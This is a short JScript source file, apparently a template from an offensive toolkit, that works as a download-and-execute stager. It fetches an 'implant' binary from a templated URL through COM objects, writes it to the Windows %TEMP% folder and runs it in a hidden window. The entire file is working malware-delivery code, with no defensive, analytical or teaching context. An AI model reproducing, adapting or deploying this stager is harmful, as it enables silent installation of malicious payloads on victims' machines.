// Download-execute JScript stager
// Downloads implant from station URL via MSXML2.XMLHTTP, writes to %TEMP%, executes.
// No PowerShell dependency — pure COM objects.
//
// Template variables (replaced at build time):
//   {{URL}}       — full download URL for the implant binary
//   {{FILENAME}}  — implant filename written to disk

var xhr = new ActiveXObject("MSXML2.XMLHTTP");
xhr.open("GET", "{{URL}}", false);
xhr.send();

if (xhr.status === 200) {
    var stream = new ActiveXObject("ADODB.Stream");
    stream.Type = 1;
    stream.Open();
    stream.Write(xhr.responseBody);

    var shell = new ActiveXObject("WScript.Shell");
    var tmp = shell.ExpandEnvironmentStrings("%TEMP%") + "\\{{FILENAME}}";

    stream.SaveToFile(tmp, 2);
    stream.Close();

    shell.Run(tmp, 0, false);
}
